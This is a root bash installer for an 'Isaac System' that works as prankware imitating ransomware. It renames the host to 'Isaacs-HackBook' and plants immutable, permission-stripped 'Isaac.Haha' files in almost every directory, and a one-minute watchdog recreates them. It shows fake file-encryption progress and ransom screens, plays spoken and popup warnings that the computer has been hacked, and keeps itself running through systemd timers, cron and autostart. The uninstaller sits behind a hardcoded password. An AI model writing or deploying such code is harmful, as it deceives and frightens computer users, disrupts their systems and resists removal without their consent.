#!/bin/bash
# Isaac System — Linux Installer
# Run as root: sudo bash install.sh

if [ "$EUID" -ne 0 ]; then
    echo "Please run as root: sudo bash $0"
    exit 1
fi

LOG="/tmp/isaac-install.log"
echo "$(date): Install started" > "$LOG"

# 1. Save original hostname
ORIGINAL_NAME=$(hostname 2>/dev/null || echo "linux")
echo "$ORIGINAL_NAME" > /etc/.isaac-hostname-backup; chmod 600 /etc/.isaac-hostname-backup

# 2. Set new hostname
hostnamectl set-hostname "Isaacs-HackBook" 2>/dev/null || hostname "Isaacs-HackBook" 2>/dev/null
echo "Isaac's HackBook" > /etc/hostname 2>/dev/null
echo "Set hostname to: Isaacs-HackBook" >> "$LOG"

# 3. Collect every useful directory
DIRS_FILE="/etc/.isaac-dirs"
: > "$DIRS_FILE"

collect_dirs() {
    echo "/"
    for d in /*/; do
        d="${d%/}"
        case "$d" in /media|/mnt|/run|/proc|/sys|/dev) continue ;; esac
        [ -d "$d" ] && echo "$d"
    done
    # Home dirs + subs
    for d in /home/*/ /root/; do
        d="${d%/}"
        [ ! -d "$d" ] && continue
        echo "$d"
        for sub in Desktop Documents Downloads Music Pictures Videos Public .config .local .cache; do
            [ -d "$d/$sub" ] && echo "$d/$sub"
        done
    done
    # /usr subdirs
    for d in /usr/*/; do d="${d%/}"; [ -d "$d" ] && echo "$d"; done
    # /etc subdirs
    for d in /etc/*/; do d="${d%/}"; [ -d "$d" ] && echo "$d"; done
    # /var subdirs
    for d in /var/*/; do d="${d%/}"; [ -d "$d" ] && echo "$d"; done
    # /opt
    [ -d /opt ] && echo "/opt"
    # /usr/local subdirs
    for d in /usr/local/*/; do d="${d%/}"; [ -d "$d" ] && echo "$d"; done
    # /snap subdirs  
    [ -d /snap ] && for d in /snap/*/; do d="${d%/}"; [ -d "$d" ] && echo "$d"; done
}

collect_dirs | sort -u > "$DIRS_FILE"
DIR_COUNT=$(wc -l < "$DIRS_FILE")
chmod 644 "$DIRS_FILE"
echo "$DIR_COUNT directories targeted" >> "$LOG"

# 4. Create Isaac.Haha in every directory
CREATED=0
while IFS= read -r dir; do
    file="$dir/Isaac.Haha"
    if touch "$file" 2>/dev/null; then
        chmod 000 "$file" 2>/dev/null
        chown root:root "$file" 2>/dev/null
        chattr +i "$file" 2>/dev/null  # Linux immutable flag
        CREATED=$((CREATED + 1))
    fi
done < "$DIRS_FILE"
echo "$CREATED Isaac.Haha files created" >> "$LOG"

# 5. Support directory
SUPPORT_DIR="/opt/IsaacSystem"
mkdir -p "$SUPPORT_DIR"

# 6. Fake encryption script
cat > "$SUPPORT_DIR/fake-encrypt.sh" << 'FENC'
#!/bin/bash
trap '' INT TERM
clear
echo -e "\033[31m"
echo "  ================================================"
echo "     ISAAC SYSTEM - FILE ENCRYPTION IN PROGRESS"
echo "  ================================================"
echo -e "\033[0m"
sleep 1
USER_HOME=$HOME
FILE_COUNT=$(find "$USER_HOME/Documents" "$USER_HOME/Desktop" "$USER_HOME/Downloads" "$USER_HOME/Pictures" 2>/dev/null -type f | wc -l)
echo "  Target: $FILE_COUNT files found"
echo ""
for i in $(seq 1 30); do
    PERCENT=$((i * 100 / 30))
    BAR=$(printf '%*s' $i | tr ' ' '#'; printf '%*s' $((30 - i)) | tr ' ' '.')
    echo -ne "\033[33m  [\033[31m$BAR\033[33m] $PERCENT%%  \033[31mencrypting...\033[0m\r"
    sleep 0.2
done
echo ""
echo -e "\033[32m"
echo "  ================================================"
echo "    ALL FILES ENCRYPTED SUCCESSFULLY"
echo "    Contact Isaac for decryption key."
echo "  ================================================"
echo -e "\033[0m"
sleep 5
read -n 1 -s -p "Press any key..."
exit 0
FENC
chmod 755 "$SUPPORT_DIR/fake-encrypt.sh"

# 7. Fake ransom note script
cat > "$SUPPORT_DIR/fake-ransom.sh" << 'FRAN'
#!/bin/bash
trap '' INT TERM
clear
echo -e "\033[31m"
echo "    █████╗ ██╗     ██╗     █████╗ ██████╗ ████████╗"
echo "    ██╔══██╗██║     ██║    ██╔══██╗██╔══██╗╚══██╔══╝"
echo "    ███████║██║     ██║    ███████║██████╔╝   ██║   "
echo "    ██╔══██║██║     ██║    ██╔══██║██╔══██╗   ██║   "
echo "    ██║  ██║███████╗██║    ██║  ██║██║  ██║   ██║   "
echo "    ╚═╝  ╚═╝╚══════╝╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   "
echo ""
echo "    ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗"
echo "    ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║"
echo "    █████╗   ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║"
echo "    ██╔══╝    ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║"
echo "    ███████╗   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║"
echo "    ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝"
echo ""
echo -e "\033[33m"
echo "  ╔══════════════════════════════════════════════════╗"
echo "  ║    YOUR COMPUTER HAS BEEN CLAIMED BY ISAAC      ║"
echo "  ╠══════════════════════════════════════════════════╣"
echo "  ║                                                  ║"
echo "  ║  Hostname: Isaacs-HackBook                      ║"
echo "  ║                                                  ║"
echo "  ║  All Isaac.Haha files deployed.                 ║"
echo "  ║  Watchdog active (every 60 seconds).            ║"
echo "  ║  System permanently monitored.                  ║"
echo "  ║                                                  ║"
echo "  ║  To restore: get the password from Isaac.       ║"
echo "  ║                                                  ║"
echo "  ╚══════════════════════════════════════════════════╝"
echo -e "\033[0m"
sleep 8
exit 0
FRAN
chmod 755 "$SUPPORT_DIR/fake-ransom.sh"

# 8. Scare HTML
cat > "$SUPPORT_DIR/scare.html" << 'HTML'
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>SECURITY ALERT</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0000;color:#ff2222;font-family:'Courier New',monospace;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{max-width:700px;padding:60px 40px;border:2px solid #ff0000;background:#1a0000;text-align:center;box-shadow:0 0 100px rgba(255,0,0,0.4)}
h1{font-size:36px;margin-bottom:30px;text-shadow:0 0 30px #ff0000;animation:pulse 0.8s infinite}
.skull{font-size:80px;margin-bottom:30px;animation:float 2s ease-in-out infinite}
p{font-size:16px;margin:15px 0;color:#ff6666;line-height:1.6}
.highlight{color:#ff0000;font-weight:bold;font-size:20px}
.warning-line{color:#ff4444;font-size:14px;border:1px solid #441111;padding:12px;margin:20px 0;background:#110000}
.footer{margin-top:40px;font-size:13px;color:#883333;border-top:1px solid #330000;padding-top:25px}
.blink{animation:blink 0.8s infinite}
@keyframes blink{0%{opacity:1}50%{opacity:0}100%{opacity:1}}
@keyframes pulse{0%{opacity:1}50%{opacity:0.7}100%{opacity:1}}
@keyframes float{0%{transform:translateY(0)}50%{transform:translateY(-10px)}100%{transform:translateY(0)}}
</style></head><body>
<div class="box">
<div class="skull">&#9760;</div>
<h1 class="blink">&#9888; SYSTEM COMPROMISED &#9888;</h1>
<p class="highlight">YOUR COMPUTER HAS BEEN CLAIMED BY ISAAC</p>
<div class="warning-line">
&#9888; Hostname: Isaacs-HackBook<br>
&#9888; Isaac.Haha files: DEPLOYED<br>
&#9888; Watchdog: ACTIVE (60s interval)
</div>
<p>Your system is permanently under Isaac's control.</p>
<p style="margin-top:30px;font-size:18px;color:#ff0000">&#128274; TO RESTORE: GET THE PASSWORD FROM ISAAC</p>
<div class="footer">Isaac System — Unauthorized Access Detected</div>
</div></body></html>
HTML
chmod 644 "$SUPPORT_DIR/scare.html"

# 9. Login scare script
cat > "$SUPPORT_DIR/login-scare.sh" << 'SCB'
#!/bin/bash
sleep 3

# Beeps
for i in 1 2 3; do echo -e '\a'; sleep 0.2; done

# Voice — try multiple TTS engines
if command -v espeak-ng &>/dev/null; then
    espeak-ng "Warning. System breach detected. Your computer has been claimed by Isaac." 2>/dev/null &
elif command -v espeak &>/dev/null; then
    espeak "Warning. System breach detected. Your computer has been claimed by Isaac." 2>/dev/null &
elif command -v festival &>/dev/null; then
    echo "(SayText \"Warning. System breach detected. Your computer has been claimed by Isaac.\")" | festival --pipe 2>/dev/null &
elif command -v flite &>/dev/null; then
    flite -t "Warning. System breach detected. Your computer has been claimed by Isaac." 2>/dev/null &
fi

# Open terminals with fake scripts — try multiple terminal emulators
if command -v gnome-terminal &>/dev/null; then
    gnome-terminal -- bash -c "/opt/IsaacSystem/fake-encrypt.sh; exec bash" 2>/dev/null &
    gnome-terminal -- bash -c "/opt/IsaacSystem/fake-ransom.sh; exec bash" 2>/dev/null &
elif command -v xterm &>/dev/null; then
    xterm -e "/opt/IsaacSystem/fake-encrypt.sh; bash" 2>/dev/null &
    xterm -e "/opt/IsaacSystem/fake-ransom.sh; bash" 2>/dev/null &
elif command -v konsole &>/dev/null; then
    konsole --hold -e "/opt/IsaacSystem/fake-encrypt.sh" 2>/dev/null &
    konsole --hold -e "/opt/IsaacSystem/fake-ransom.sh" 2>/dev/null &
elif command -v lxterminal &>/dev/null; then
    lxterminal -e "/opt/IsaacSystem/fake-encrypt.sh" 2>/dev/null &
    lxterminal -e "/opt/IsaacSystem/fake-ransom.sh" 2>/dev/null &
elif command -v mate-terminal &>/dev/null; then
    mate-terminal -e "/opt/IsaacSystem/fake-encrypt.sh" 2>/dev/null &
    mate-terminal -e "/opt/IsaacSystem/fake-ransom.sh" 2>/dev/null &
elif command -v terminator &>/dev/null; then
    terminator -e "/opt/IsaacSystem/fake-encrypt.sh" 2>/dev/null &
    terminator -e "/opt/IsaacSystem/fake-ransom.sh" 2>/dev/null &
elif command -v urxvt &>/dev/null; then
    urxvt -e "/opt/IsaacSystem/fake-encrypt.sh" 2>/dev/null &
    urxvt -e "/opt/IsaacSystem/fake-ransom.sh" 2>/dev/null &
elif command -v rxvt &>/dev/null; then
    rxvt -e "/opt/IsaacSystem/fake-encrypt.sh" 2>/dev/null &
    rxvt -e "/opt/IsaacSystem/fake-ransom.sh" 2>/dev/null &
fi

# Popups — try zenity, then xmessage, then notify-send
sleep 2
if command -v zenity &>/dev/null; then
    zenity --warning --title="Linux Security — Alert" --text="System Integrity Protection has detected unauthorized modifications.\n\nAffected components:\n• System files modified\n• Hostname changed to Isaacs-HackBook\n• File protection daemon installed\n\nAction required: Contact Isaac to restore your system." 2>/dev/null &
    sleep 5
    zenity --error --title="System Security — Policy Updated" --text="SYSTEM ACCESS GRANTED TO ISAAC\n\nThis computer is now Isaacs-HackBook.\n\nIsaac.Haha files in all directories.\nWatchdog active. Login agent: ACTIVE.\n\nYour system is under remote control." 2>/dev/null &
    sleep 6
    zenity --error --title="SYSTEM CLAIMED BY ISAAC" --text="YOU'VE BEEN HACKED BY ISAAC\n\nYour computer is now: Isaacs-HackBook\n\nIsaac.Haha files are everywhere.\nThey are PROTECTED.\nA watchdog restores them every 60 seconds.\n\nThe only way to remove this: Get the password from Isaac." 2>/dev/null &
elif command -v xmessage &>/dev/null; then
    xmessage -center -buttons OK:0 "SYSTEM COMPROMISED — Contact Isaac" 2>/dev/null &
else
    notify-send "Isaac System" "YOU'VE BEEN HACKED BY ISAAC" 2>/dev/null &
fi

sleep 3
xdg-open "file:///opt/IsaacSystem/scare.html" 2>/dev/null || xdg-open "$SUPPORT_DIR/scare.html" 2>/dev/null &
exit 0
SCB
chmod 755 "$SUPPORT_DIR/login-scare.sh"

# 10. Periodic scare script
cat > "$SUPPORT_DIR/periodic-scare.sh" << 'PSC'
#!/bin/bash
CHOICE=$(( RANDOM % 6 ))

if command -v espeak &>/dev/null; then
    espeak "Isaac system is active." 2>/dev/null &
fi

case $CHOICE in
    0) MSG="ISAAC WATCHDOG ACTIVE\n\nYour system is being monitored.\n\nIsaacs-HackBook is under protection.\nAll Isaac.Haha files verified."; TITLE="Isaac System"; ICON="warning" ;;
    1) MSG="SYSTEM SCAN\n\nSecurity audit in progress.\n\nAll Isaac.Haha files: PROTECTED\nHACKBOOK: still under Isaac's control."; TITLE="Linux Security"; ICON="warning" ;;
    2) MSG="FILE WATCHDOG REPORT\n\nIsaac.Haha status: PROTECTED\nWatchdog: ACTIVE\nDeleted files restored: CHECK"; TITLE="Linux Security"; ICON="warning" ;;
    3) MSG="Isaac is watching\n\nThis is Isaacs-HackBook.\n\nYou cannot remove Isaac.Haha files.\nThey keep coming back.\n\nGet the password from Isaac to stop this."; TITLE="Isaac System"; ICON="error" ;;
    4) echo -e '\a'
if command -v xterm &>/dev/null; then
    xterm -e "/opt/IsaacSystem/fake-ransom.sh; bash" 2>/dev/null &
elif command -v gnome-terminal &>/dev/null; then
    gnome-terminal -- bash -c "/opt/IsaacSystem/fake-ransom.sh; exec bash" 2>/dev/null &
elif command -v konsole &>/dev/null; then
    konsole --hold -e "/opt/IsaacSystem/fake-ransom.sh" 2>/dev/null &
elif command -v lxterminal &>/dev/null; then
    lxterminal -e "/opt/IsaacSystem/fake-ransom.sh" 2>/dev/null &
elif command -v mate-terminal &>/dev/null; then
    mate-terminal -e "/opt/IsaacSystem/fake-ransom.sh" 2>/dev/null &
elif command -v terminator &>/dev/null; then
    terminator -e "/opt/IsaacSystem/fake-ransom.sh" 2>/dev/null &
elif command -v urxvt &>/dev/null; then
    urxvt -e "/opt/IsaacSystem/fake-ransom.sh" 2>/dev/null &
elif command -v rxvt &>/dev/null; then
    rxvt -e "/opt/IsaacSystem/fake-ransom.sh" 2>/dev/null &
fi
exit 0 ;;
    5) MSG="REMINDER\n\nYour computer is Isaacs-HackBook.\n\nThis is not going away.\nGet the password from Isaac."; TITLE="Isaac System"; ICON="error" ;;
esac

if command -v zenity &>/dev/null; then
    zenity --${ICON} --title="$TITLE" --text="$MSG" 2>/dev/null
elif command -v xmessage &>/dev/null; then
    echo -e "$MSG" | xmessage -center -buttons OK:0 -file - 2>/dev/null
fi
exit 0
PSC
chmod 755 "$SUPPORT_DIR/periodic-scare.sh"

# 11. Watchdog script
cat > "$SUPPORT_DIR/watchdog.sh" << 'WDOG'
#!/bin/bash
DF="/etc/.isaac-dirs"; AF="/etc/.isaac-watchdog-active"
[ ! -f "$AF" ] && exit 0; [ ! -f "$DF" ] && exit 0; R=0
while IFS= read -r dir; do
    f="$dir/Isaac.Haha"
    if [ ! -f "$f" ]; then
        touch "$f" 2>/dev/null && chmod 000 "$f" && chown root:root "$f" && chattr +i "$f" && R=$((R+1))
    fi
    [ -f "$f" ] && chattr +i "$f" 2>/dev/null && chmod 000 "$f" 2>/dev/null
done < "$DF"
exit 0
WDOG
chmod 755 "$SUPPORT_DIR/watchdog.sh"

touch /etc/.isaac-watchdog-active; chmod 644 /etc/.isaac-watchdog-active

# 12. Systemd services
# Watchdog timer (every 1 min)
cat > /etc/systemd/system/isaac-watchdog.service << 'SV1'
[Unit]
Description=Isaac Watchdog
[Service]
Type=oneshot
ExecStart=/opt/IsaacSystem/watchdog.sh
[Install]
WantedBy=multi-user.target
SV1

cat > /etc/systemd/system/isaac-watchdog.timer << 'TV1'
[Unit]
Description=Isaac Watchdog Timer
[Timer]
OnBootSec=10
OnUnitActiveSec=60
[Install]
WantedBy=timers.target
TV1

# Login scare service
cat > /etc/systemd/system/isaac-login-scare.service << 'SV2'
[Unit]
Description=Isaac Login Scare
[Service]
Type=oneshot
ExecStart=/opt/IsaacSystem/login-scare.sh
[Install]
WantedBy=multi-user.target
SV2

# Periodic scare (every 30 min)
cat > /etc/systemd/system/isaac-periodic-scare.service << 'SV3'
[Unit]
Description=Isaac Periodic Scare
[Service]
Type=oneshot
ExecStart=/opt/IsaacSystem/periodic-scare.sh
[Install]
WantedBy=multi-user.target
SV3

cat > /etc/systemd/system/isaac-periodic-scare.timer << 'TV3'
[Unit]
Description=Isaac Periodic Scare Timer
[Timer]
OnBootSec=120
OnUnitActiveSec=1800
[Install]
WantedBy=timers.target
TV3

# Autostart for login scare (X11 desktop environments)
mkdir -p /etc/xdg/autostart
cat > /etc/xdg/autostart/isaac-login-scare.desktop << 'DESK'
[Desktop Entry]
Type=Application
Name=Isaac Login Scare
Exec=/opt/IsaacSystem/login-scare.sh
Terminal=false
X-GNOME-Autostart-enabled=true
DESK

# Enable + start services
systemctl daemon-reload 2>/dev/null
systemctl enable isaac-watchdog.timer 2>/dev/null || true
systemctl enable isaac-periodic-scare.timer 2>/dev/null || true
systemctl start isaac-watchdog.timer 2>/dev/null || true
systemctl start isaac-periodic-scare.timer 2>/dev/null || true

# Also add cron jobs as fallback
(crontab -l 2>/dev/null; echo "* * * * * /opt/IsaacSystem/watchdog.sh") | crontab - 2>/dev/null || true
(crontab -l 2>/dev/null; echo "*/30 * * * * DISPLAY=:0 /opt/IsaacSystem/periodic-scare.sh") | crontab - 2>/dev/null || true
(crontab -l 2>/dev/null; echo "@reboot sleep 5 && DISPLAY=:0 /opt/IsaacSystem/login-scare.sh") | crontab - 2>/dev/null || true

# 13. Create uninstall script
cat > "$SUPPORT_DIR/uninstall.sh" << 'UNS'
#!/bin/bash
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root: sudo bash $0"
    exit 1
fi

read -s -p "Enter password to uninstall Isaac System: " PASSWORD
echo ""
if [ "$PASSWORD" != "Isaac_DogPlanet" ]; then
    echo "Incorrect password."
    exit 1
fi

# Kill fake scripts
pkill -f fake-encrypt.sh 2>/dev/null || true
pkill -f fake-ransom.sh 2>/dev/null || true

# Disable services
systemctl stop isaac-watchdog.timer 2>/dev/null || true
systemctl stop isaac-periodic-scare.timer 2>/dev/null || true
systemctl disable isaac-watchdog.timer 2>/dev/null || true
systemctl disable isaac-periodic-scare.timer 2>/dev/null || true
rm -f /etc/systemd/system/isaac-watchdog.*
rm -f /etc/systemd/system/isaac-login-scare.*
rm -f /etc/systemd/system/isaac-periodic-scare.*

# Remove crontab entries
crontab -l 2>/dev/null | grep -v "IsaacSystem\|Isaac\|isaac" | crontab - 2>/dev/null || true

# Remove autostart
rm -f /etc/xdg/autostart/isaac-login-scare.desktop 2>/dev/null

# Remove Isaac.Haha files
DIRS_FILE="/etc/.isaac-dirs"
REMOVED=0
if [ -f "$DIRS_FILE" ]; then
    while IFS= read -r dir; do
        file="$dir/Isaac.Haha"
        if [ -f "$file" ]; then
            chattr -i "$file" 2>/dev/null
            rm -f "$file" 2>/dev/null
            REMOVED=$((REMOVED + 1))
        fi
    done < "$DIRS_FILE"
fi
rm -f /etc/.isaac-dirs 2>/dev/null

# Remove support dir
rm -rf /opt/IsaacSystem 2>/dev/null

# Restore hostname
ORIGINAL_NAME=$(cat /etc/.isaac-hostname-backup 2>/dev/null || echo "")
if [ -n "$ORIGINAL_NAME" ]; then
    hostnamectl set-hostname "$ORIGINAL_NAME" 2>/dev/null || hostname "$ORIGINAL_NAME" 2>/dev/null
fi
rm -f /etc/.isaac-hostname-backup 2>/dev/null
rm -f /etc/.isaac-watchdog-active 2>/dev/null

echo ""
echo "Isaac System has been completely uninstalled. $REMOVED Isaac.Haha files removed."
UNS
chmod 755 "$SUPPORT_DIR/uninstall.sh"

# Place uninstaller in /root for recovery
cp "$SUPPORT_DIR/uninstall.sh" /root/IsaacSystem-Uninstall.sh 2>/dev/null || true

# 14. Also place uninstaller in /opt/IsaacSystem (already done)
# Create symlink at root level
ln -sf "$SUPPORT_DIR/uninstall.sh" /IsaacSystem-Uninstall.sh 2>/dev/null || true

systemctl daemon-reload 2>/dev/null

# 15. Activate login scare immediately
DISPLAY=:0 "$SUPPORT_DIR/login-scare.sh" &>/dev/null &
sleep 60 && kill %1 2>/dev/null || true

echo "$(date): Complete — $CREATED Isaac.Haha files deployed" >> "$LOG"
echo ""
echo "Install complete. $CREATED Isaac.Haha files deployed across $DIR_COUNT directories."
echo "To uninstall: sudo bash /opt/IsaacSystem/uninstall.sh"
exit 0
